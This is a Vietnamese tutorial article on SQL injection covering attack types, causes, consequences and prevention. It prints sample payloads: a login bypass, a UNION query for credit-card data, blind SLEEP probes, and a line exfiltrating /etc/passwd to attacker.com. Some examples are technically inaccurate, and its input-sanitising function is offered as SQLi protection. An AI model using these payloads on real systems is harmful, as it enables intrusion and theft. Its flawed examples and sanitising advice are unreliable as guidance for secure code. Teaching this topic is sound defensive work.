# SQL Injection: Những rủi ro tiềm ẩn và phương pháp phòng ngừa hiệu quả

<small>*Cập nhật ngày: 01 tháng 07, 2024*</small>

## Nội dung của bài viết:
[I. SQL Injection (SQLi) là gì?](#what-is-sql-injection)

[II. Cách hoạt động.](#how-it-works)

[III. Các loại tấn công SQLi phổ biến.](#common-types-of-sqli-attacks)
- [1. In-band SQLi](#in-band-sqli)
- [2. Inferential SQLi (Blind SQLi)](#inferential-sqli)
- [3. Out-of-band SQLi](#out-of-band-sqli)

[IV. Nguyên nhân chính của lỗ hổng SQL Injection (SQLi).](#main-cause-of-sql-injection-sqli-vulnerability)
- [1. Sử dụng các truy vấn SQL không an toàn](#using-unsafe-sql-queries)
- [2. Thiếu kiểm tra và lọc dữ liệu đầu vào](#lack-of-checking-and-filtering-input-data)
- [3. Sử dụng các hàm SQL nguy hiểm](#using-dangerous-sql-functions)
- [4. Quản lý xác thực và phiên làm việc yếu](#weak-authentication-and-session-management)
- [5. Sử dụng phần mềm lỗi thời](#using-outdated-software)
- [6. Thiếu nhận thức về bảo mật](#lack-of-security-awareness)

[V. Hậu quả nghiêm trọng của tấn công SQL Injection (SQLi).](#serious-consequences-of-sql-injection-sqli-attack)
- [1. Mất dữ liệu](#data-loss)
- [2. Gián đoạn hoạt động](#operational-interruption)
- [3. Tổn hại uy tín](#damage-to-reputation)
- [4. Bị phạt](#fine)
- [5. Khởi đầu cho các cuộc tấn công khác](#initiation-for-other-attacks)

[VI. Làm thế nào để ngăn chặn hiệu quả các cuộc tấn công SQL Injection (SQLi).](#how-to-effectively-prevent-sql-injection-sqli-attacks)
- [1. Sử dụng các tham số chuẩn bị sẵn](#use-prepared-parameters)
- [2. Thực hiện kiểm tra và lọc dữ liệu đầu vào](#perform-checking-and-filtering-of-input-data)
- [3. Hạn chế sử dụng các hàm SQL nguy hiểm](#limit-the-use-of-dangerous-sql-functions)
- [4. Sử dụng hệ thống quản lý xác thực và phiên làm việc mạnh](#use-a-strong-authentication-and-session-management-system)
- [5. Cập nhật phần mềm thường xuyên](#update-software-regularly)
- [6. Nâng cao nhận thức về bảo mật](#raise-security-awareness)
- [7. Sử dụng công cụ quét bảo mật](#use-a-security-scanning-tool)
- [8. Thực hiện kiểm tra xâm nhập](#perform-penetration-testing)

<a name="what-is-sql-injection"></a>
## I. SQL Injection (SQLi) là gì? 
`SQL Injection` (Tấn công SQL) viết tắt là `SQLi`, là một kỹ thuật tấn công mạng nguy hiểm cho phép kẻ tấn công lợi dụng lỗ hổng bảo mật trong các ứng dụng web để thực thi các câu lệnh SQL không được phép. Mục tiêu của kẻ tấn công là đánh cắp dữ liệu nhạy cảm, phá hoại cơ sở dữ liệu hoặc chiếm quyền truy cập vào hệ thống.

Trong nhiều trường hợp, `SQL Injection (SQLi)` có thể bị khai thác để leo thang tấn công nghiêm trọng hơn, vượt qua mục tiêu lấy cắp dữ liệu thông thường:

- **Leo thang quyền:**
    - **Thông tin nhạy cảm bị lộ:** Đôi khi, một truy vấn SQLi của kẻ tấn công có thể vô tình tiết lộ thông tin về cấu hình hệ thống, chẳng hạn như tên người dùng và quyền hạn của tài khoản cơ sở dữ liệu đang được sử dụng.
    - **Tìm kiếm tài khoản đặc quyền:** Với thông tin này, kẻ tấn công có thể cố gắng tìm và khai thác các tài khoản có quyền hạn cao hơn trong hệ thống cơ sở dữ liệu, chẳng hạn như tài khoản `root` hoặc tài khoản quản trị.
    - **Thực thi lệnh trên hệ điều hành:** Nếu kẻ tấn công thành công trong việc chiếm quyền truy cập vào một tài khoản đặc quyền, họ có thể sử dụng quyền đó để thực thi các lệnh trên hệ điều hành của máy chủ, cho phép họ cài đặt phần mềm độc hại, xóa dữ liệu hoặc chiếm quyền kiểm soát hoàn toàn hệ thống.

- **Tấn công từ chối dịch vụ (DoS):**
    - **Lạm dụng tài nguyên:** Kẻ tấn công có thể sử dụng SQLi để thực hiện một số lượng lớn các truy vấn không cần thiết hoặc phức tạp vào cơ sở dữ liệu.
    - **Quá tải hệ thống:** Điều này có thể làm quá tải tài nguyên của máy chủ cơ sở dữ liệu, khiến nó chạy chậm hoặc thậm chí ngừng hoạt động hoàn toàn, ngăn cản người dùng hợp pháp truy cập dịch vụ.
    - **Tấn công DoS quy mô lớn:** Trong một số trường hợp, kẻ tấn công có thể kết hợp SQLi với các kỹ thuật khác để tạo ra một cuộc tấn công DoS quy mô lớn hơn, ảnh hưởng đến toàn bộ hệ thống hoặc mạng lưới.

## II. Cách hoạt động. <a name="how-it-works"></a>
- **Kẻ tấn công xác định lỗ hổng:** Kẻ tấn công tìm kiếm những điểm yếu trong các ứng dụng web nơi họ có thể chèn mã SQL độc hại. Lỗ hổng này thường xuất hiện trong các biểu mẫu nhập dữ liệu, nơi người dùng cung cấp thông tin như tên đăng nhập, mật khẩu hoặc thông tin thanh toán.
- **Chèn mã SQL độc hại:** Kẻ tấn công chèn mã SQL độc hại vào dữ liệu đầu vào của ứng dụng. Mã này có thể được ẩn với các ký tự đặc biệt hoặc được mã hóa để vượt qua các biện pháp bảo mật cơ bản.
- **Thực thi mã SQL:** Khi ứng dụng web xử lý dữ liệu đầu vào, mã SQL độc hại được thực thi trên cơ sở dữ liệu. Điều này cho phép kẻ tấn công thực hiện nhiều hành động độc hại, bao gồm:
    - **Đánh cắp dữ liệu:** Kẻ tấn công có thể truy cập và sao chép dữ liệu nhạy cảm từ cơ sở dữ liệu, chẳng hạn như thông tin tài khoản người dùng, thông tin tài chính hoặc bí mật công ty.
    - **Thay đổi dữ liệu:** Kẻ tấn công có thể thay đổi hoặc xóa dữ liệu trong cơ sở dữ liệu, gây thiệt hại hoặc gián đoạn hoạt động kinh doanh.
    - **Khởi động các cuộc tấn công khác:** Kẻ tấn công có thể sử dụng quyền truy cập vào cơ sở dữ liệu để thực hiện các cuộc tấn công khác, chẳng hạn như tấn công ransomware hoặc tấn công từ chối dịch vụ (DoS) như đã giải thích ở trên.

Ví dụ, giả sử một trang web có một biểu mẫu đăng nhập đơn giản cho người dùng nhập tên đăng nhập và mật khẩu tương tự như câu lệnh truy vấn sau:

```sql
CREATE FUNCTION GetUserInformation(p_username VARCHAR(255), p_password VARCHAR(255))
RETURNS TABLE
AS
RETURN (
SELECT * FROM users
WHERE username = p_username AND password = p_password
);
```

Biểu mẫu này có thể dễ bị SQLi nếu không được bảo vệ đúng cách. Kẻ tấn công có thể gửi yêu cầu đăng nhập với tên đăng nhập là `admin' OR 1=1; --` và nhập bất kỳ mật khẩu nào:

```sql
SELECT * FROM users
WHERE username = 'admin' OR 1=1; --' AND password = 'abc123'
```

Mã SQL độc hại này sẽ đánh lừa ứng dụng web tin rằng người dùng đang cố gắng đăng nhập với tên đăng nhập `admin` và bất kỳ mật khẩu nào. Tuy nhiên, vì dấu nháy đơn `'` sau `admin` kết thúc chuỗi đầu vào và dấu gạch ngang đôi `--` là một nhận xét trong SQL, toàn bộ mã đằng sau bị vô hiệu hóa. Mã này luôn đúng vì ngay cả khi tên đăng nhập sai, điều kiện `OR 1=1` sẽ trả về `TRUE`, bất kỳ ai cũng có thể lấy dữ liệu hoặc đăng nhập vào trang web bằng tên đăng nhập và mật khẩu như thế này.

<a name="common-types-of-sqli-attacks"></a>
## III. Các loại tấn công SQLi phổ biến. 

<a name="in-band-sqli"></a>
### 1. In-band SQLi 
Đây là loại tấn công SQLi phổ biến nhất và cũng dễ khai thác nhất. Kẻ tấn công thu thập kết quả của mã SQL độc hại được thực thi thông qua phản hồi của ứng dụng web. Phản hồi này có thể bao gồm thông báo lỗi, nội dung trang web hoặc thậm chí là dữ liệu từ cơ sở dữ liệu.

**In-band SQLi có thể được chia thành hai loại phụ:**

- **Error-based SQLi:** Kẻ tấn công sử dụng thông báo lỗi từ cơ sở dữ liệu để hiểu cấu trúc của cơ sở dữ liệu và kiểm tra xem mã SQL độc hại có được thực thi hay không. Các thông báo lỗi này thường chứa thông tin chi tiết về cơ sở dữ liệu, giúp kẻ tấn công tìm ra lỗ hổng và khai thác nó.
- **Union-based SQLi:** Kẻ tấn công sử dụng từ khóa `UNION` để kết hợp kết quả của truy vấn độc hại với truy vấn hợp lệ của ứng dụng. Điều này cho phép kẻ tấn công thu thập dữ liệu từ các bảng khác nhau trong cơ sở dữ liệu thông qua phản hồi của ứng dụng web.

    ```sql
    SELECT username, password FROM users WHERE id = 1 UNION SELECT credit_card_number, expiration_date FROM credit_cards;
    ```

<a name="inferential-sqli"></a>
### 2. Inferential SQLi (Blind SQLi) 
Kẻ tấn công không thu thập được kết quả trực tiếp của mã SQL độc hại từ phản hồi của ứng dụng web. Thay vào đó, họ suy đoán thông tin từ phản hồi gián tiếp như thời gian phản hồi hoặc hành vi của ứng dụng. Blind SQLi có thể khó khai thác hơn so với In-band SQLi, nhưng vẫn có thể gây ra hậu quả nghiêm trọng.

**Inferential SQLi có thể được chia thành hai loại phụ:**

- **Boolean-based Blind SQLi:** Kẻ tấn công gửi các truy vấn SQL độc hại để kiểm tra các điều kiện đúng/sai. Dựa vào phản hồi của ứng dụng (ví dụ: trang web hiển thị hay không hiển thị thông tin), kẻ tấn công có thể suy đoán thông tin về cấu trúc cơ sở dữ liệu và dữ liệu trong đó.

    ```sql
    SELECT * FROM users WHERE id = 1 AND 1=1; -- Điều kiện đúng, trang web hiển thị thông tin
    SELECT * FROM users WHERE id = 1 AND 1=2; -- Điều kiện sai, trang web không hiển thị thông tin
    ```

- **Time-based Blind SQLi:** Kẻ tấn công gửi các truy vấn SQL độc hại để kiểm tra thời gian phản hồi của ứng dụng. Dựa vào thời gian phản hồi, kẻ tấn công có thể suy đoán thông tin về cơ sở dữ liệu.

    ```sql
    SELECT IF(1=1, SLEEP(5), 0); -- Nếu điều kiện đúng, cơ sở dữ liệu sẽ ngủ trong 5 giây
    SELECT IF(1=2, SLEEP(5), 0); -- Nếu điều kiện sai, cơ sở dữ liệu sẽ không ngủ
    ```

<a name="out-of-band-sqli"></a>
### 3. Out-of-band SQLi
Kẻ tấn công không thu thập được kết quả trực tiếp từ phản hồi của ứng dụng web và cũng không thể suy đoán thông tin từ phản hồi gián tiếp. Thay vào đó, họ sử dụng các kỹ thuật khác để thu thập dữ liệu từ cơ sở dữ liệu. Out-of-band SQLi thường yêu cầu cơ sở dữ liệu và ứng dụng web có các kênh truyền thông khác nhau, chẳng hạn như gửi dữ liệu qua email hoặc HTTP requests.

**Ví dụ về Out-of-band SQLi:**

```sql
SELECT LOAD_FILE('/etc/passwd') INTO OUTFILE 'http://attacker.com/data.txt'; -- Kẻ tấn công tải tệp tin lên server của mình thông qua HTTP request
```

**Ngoài ra còn có một số kiểu tấn công SQLi ít phổ biến hơn, bao gồm:**
- **Second-order SQLi:** Kẻ tấn công lợi dụng dữ liệu được lưu trữ trong cơ sở dữ liệu để thực hiện các truy vấn SQL trái phép.
- **NoSQL injection:** Kẻ tấn công nhắm vào cơ sở dữ liệu NoSQL, chẳng hạn như `MongoDB` hoặc `Cassandra`.
- **XML injection:** Kẻ tấn công nhắm vào các ứng dụng web sử dụng XML để xử lý dữ liệu.

<a name="main-cause-of-sql-injection-sqli-vulnerability"></a>
## IV. Nguyên nhân chính của lỗ hổng SQL Injection (SQLi). 
Lỗ hổng `SQL Injection (SQLi)` xuất hiện do nhiều yếu tố khác nhau, nhưng nguyên nhân chính thường là do lỗi trong quá trình lập trình và quản lý ứng dụng web.

<a name="using-unsafe-sql-queries"></a>
### 1. Sử dụng các truy vấn SQL không an toàn
Các truy vấn SQL không an toàn là nguyên nhân chính của lỗ hổng SQL Injection. Khi các truy vấn này không được xây dựng một cách an toàn, chúng có thể bị lợi dụng để thực thi mã SQL độc hại. Điều này thường xảy ra khi các biến đầu vào từ người dùng được nhúng trực tiếp vào truy vấn SQL mà không được kiểm tra hoặc xử lý đúng cách.

<a name="lack-of-checking-and-filtering-input-data"></a>
### 2. Thiếu kiểm tra và lọc dữ liệu đầu vào
Thiếu kiểm tra và lọc dữ liệu đầu vào từ người dùng là một trong những nguyên nhân chính của lỗ hổng SQL Injection. Khi các dữ liệu đầu vào không được kiểm tra và lọc đúng cách, kẻ tấn công có thể chèn mã SQL độc hại vào các trường nhập liệu và khai thác lỗ hổng này.

<a name="using-dangerous-sql-functions"></a>
### 3. Sử dụng các hàm SQL nguy hiểm
Sử dụng các hàm SQL nguy hiểm như `EXEC`, `sp_executesql`, hoặc `eval()` mà không kiểm tra dữ liệu đầu vào có thể dẫn đến lỗ hổng SQL Injection. Các hàm này cho phép thực thi mã SQL động, và khi chúng nhận dữ liệu đầu vào không an toàn, chúng có thể bị lợi dụng để thực thi mã SQL độc hại.

<a name="weak-authentication-and-session-management"></a>
### 4. Quản lý xác thực và phiên làm việc yếu
Quản lý xác thực và phiên làm việc yếu có thể dẫn đến lỗ hổng SQL Injection. Khi hệ thống không bảo vệ đúng cách các thông tin xác thực và phiên làm việc của người dùng, kẻ tấn công có thể lợi dụng lỗ hổng này để truy cập vào hệ thống và thực thi mã SQL độc hại.

<a name="using-outdated-software"></a>
### 5. Sử dụng phần mềm lỗi thời
Sử dụng phần mềm lỗi thời, đặc biệt là các hệ thống quản lý cơ sở dữ liệu và ứng dụng web, có thể dẫn đến lỗ hổng SQL Injection. Các phiên bản phần mềm lỗi thời thường chứa các lỗ hổng bảo mật đã được khắc phục trong các phiên bản mới hơn. Khi không cập nhật phần mềm thường xuyên, hệ thống trở nên dễ bị tấn công.

<a name="lack-of-security-awareness"></a>
### 6. Thiếu nhận thức về bảo mật
Thiếu nhận thức về bảo mật của các nhà phát triển và người quản lý hệ thống là một trong những nguyên nhân chính của lỗ hổng SQL Injection. Khi không có kiến thức đầy đủ về các nguy cơ bảo mật và các biện pháp phòng ngừa, hệ thống dễ bị tấn công và khai thác.

<a name="serious-consequences-of-sql-injection-sqli-attack"></a>
## V. Hậu quả nghiêm trọng của tấn công SQL Injection (SQLi). 
Các cuộc tấn công `SQL Injection (SQLi)` có thể gây ra nhiều hậu quả nghiêm trọng cho doanh nghiệp, tổ chức, bao gồm:

<a name="data-loss"></a>
### 1. Mất dữ liệu
Tấn công SQL Injection có thể dẫn đến mất dữ liệu quan trọng. Kẻ tấn công có thể truy cập và xóa dữ liệu từ cơ sở dữ liệu, gây thiệt hại lớn cho doanh nghiệp hoặc tổ chức.

<a name="operational-interruption"></a>
### 2. Gián đoạn hoạt động
Tấn công SQL Injection có thể gây gián đoạn hoạt động của hệ thống. Kẻ tấn công có thể làm quá tải hệ thống cơ sở dữ liệu hoặc gây ra các lỗi nghiêm trọng, khiến hệ thống không thể hoạt động bình thường.

<a name="damage-to-reputation"></a>
### 3. Tổn hại uy tín
Mất dữ liệu và gián đoạn hoạt động có thể dẫn đến tổn hại uy tín của doanh nghiệp hoặc tổ chức. Khách hàng và đối tác có thể mất niềm tin vào khả năng bảo mật của hệ thống và chuyển sang sử dụng dịch vụ của đối thủ.

<a name="fine"></a>
### 4. Bị phạt
Doanh nghiệp hoặc tổ chức bị tấn công SQL Injection có thể bị phạt bởi các cơ quan quản lý nếu không tuân thủ các quy định về bảo mật dữ liệu. Các quy định này có thể bao gồm luật bảo vệ dữ liệu cá nhân và quy định về bảo mật thông tin.

<a name="initiation-for-other-attacks"></a>
### 5. Khởi đầu cho các cuộc tấn công khác
Tấn công SQL Injection có thể là khởi đầu cho các cuộc tấn công khác. Kẻ tấn công có thể sử dụng quyền truy cập vào cơ sở dữ liệu để thực hiện các cuộc tấn công từ chối dịch vụ (DoS), tấn công mạng xã hội, hoặc tấn công mã độc.

<a name="how-to-effectively-prevent-sql-injection-sqli-attacks"></a>
## VI. Làm thế nào để ngăn chặn hiệu quả các cuộc tấn công SQL Injection (SQLi).
Để bảo vệ các ứng dụng web khỏi các cuộc tấn công SQL Injection (SQLi) nguy hiểm, việc thực hiện các biện pháp phòng ngừa hiệu quả là vô cùng quan trọng. Dưới đây là một số giải pháp cụ thể kèm theo ví dụ:

<a name="use-prepared-parameters"></a>
### 1. Sử dụng các tham số chuẩn bị sẵn
Sử dụng các tham số chuẩn bị sẵn trong các truy vấn SQL là một trong những phương pháp hiệu quả nhất để ngăn chặn tấn công SQL Injection. Các tham số này cho phép xây dựng các truy vấn SQL mà không nhúng trực tiếp các biến đầu vào từ người dùng, giảm nguy cơ lỗ hổng bảo mật.

Ví dụ:
```sql
-- Mã SQL không an toàn (có thể bị tấn công SQLi)
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $query);
```

```sql
-- Mã SQL an toàn sử dụng các tham số đã chuẩn bị sẵn
$username = $_POST['username'];
$password = $_POST['password'];

$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
```

<a name="perform-checking-and-filtering-of-input-data"></a>
### 2. Thực hiện kiểm tra và lọc dữ liệu đầu vào
Kiểm tra và lọc dữ liệu đầu vào từ người dùng là một bước quan trọng để ngăn chặn tấn công SQL Injection. Các biến đầu vào nên được kiểm tra để đảm bảo rằng chúng chỉ chứa các giá trị hợp lệ và không chứa mã độc hại.

Ví dụ (PHP):
```php
function sanitizeInput($data) {
  $data = trim($data);
  $data = stripslashes($data);
  $data = htmlspecialchars($data);
  $data = filter_var($data, FILTER_SANITIZE_STRING);
  return $data;
}

$username = sanitizeInput($_POST['username']);
$password = sanitizeInput($_POST['password']);

// Sử dụng $username và $password đã lọc trong các truy vấn SQL
```

<a name="limit-the-use-of-dangerous-sql-functions"></a>
### 3. Hạn chế sử dụng các hàm SQL nguy hiểm
Hạn chế sử dụng các hàm SQL nguy hiểm như `EXEC`, `sp_executesql`, hoặc `eval()` có thể giảm nguy cơ lỗ hổng SQL Injection. Khi cần sử dụng các hàm này, nên kiểm tra và xử lý dữ liệu đầu vào một cách cẩn thận.

<a name="use-a-strong-authentication-and-session-management-system"></a>
### 4. Sử dụng hệ thống quản lý xác thực và phiên làm việc mạnh
Sử dụng hệ thống quản lý xác thực và phiên làm việc mạnh là một biện pháp quan trọng để ngăn chặn tấn công SQL Injection. Hệ thống nên bảo vệ thông tin xác thực và phiên làm việc của người dùng bằng cách sử dụng mã hóa và các biện pháp bảo mật khác.

<a name="update-software-regularly"></a>
### 5. Cập nhật phần mềm thường xuyên
Cập nhật phần mềm thường xuyên để khắc phục các lỗ hổng bảo mật là một biện pháp quan trọng để ngăn chặn tấn công SQL Injection. Các phiên bản phần mềm mới thường chứa các bản vá bảo mật để bảo vệ hệ thống khỏi các cuộc tấn công mới nhất.

<a name="raise-security-awareness"></a>
### 6. Nâng cao nhận thức về bảo mật
Nâng cao nhận thức về bảo mật của các nhà phát triển và người quản lý hệ thống là một biện pháp quan trọng để ngăn chặn tấn công SQL Injection. Các nhà phát triển nên được đào tạo về các nguy cơ bảo mật và các biện pháp phòng ngừa để xây dựng các ứng dụng web an toàn.

<a name="use-a-security-scanning-tool"></a>
### 7. Sử dụng công cụ quét bảo mật
Sử dụng các công cụ quét bảo mật để kiểm tra các lỗ hổng trong ứng dụng web và cơ sở dữ liệu là một biện pháp quan trọng để ngăn chặn tấn công SQL Injection. Các công cụ này có thể phát hiện và báo cáo các lỗ hổng, cho phép các nhà phát triển khắc phục trước khi chúng bị khai thác.

<a name="perform-penetration-testing"></a>
### 8. Thực hiện kiểm tra xâm nhập
Thực hiện kiểm tra xâm nhập định kỳ để kiểm tra và đánh giá bảo mật của hệ thống là một biện pháp quan trọng để ngăn chặn tấn công SQL Injection. Kiểm tra xâm nhập giúp phát hiện các lỗ hổng bảo mật và đề xuất các biện pháp khắc phục để bảo vệ hệ thống khỏi các cuộc tấn công.

SQL Injection (SQLi) là mối đe dọa nguy hiểm tiềm tàng đối với bất kỳ ứng dụng web nào. Tuy nhiên, bằng cách chủ động áp dụng các biện pháp phòng ngừa và biện pháp bảo mật tốt nhất, các doanh nghiệp và tổ chức có thể xây dựng một bức tường thành vững chắc để bảo vệ dữ liệu và hệ thống của họ.\
Hãy nhớ rằng, an ninh mạng là một hành trình liên tục, đòi hỏi nỗ lực và cập nhật liên tục. Hãy luôn chủ động và trang bị cho mình những kiến thức, công cụ cần thiết để chống lại các mối đe dọa an ninh mạng ngày càng tinh vi và bảo vệ dữ liệu, hệ thống một cách hiệu quả.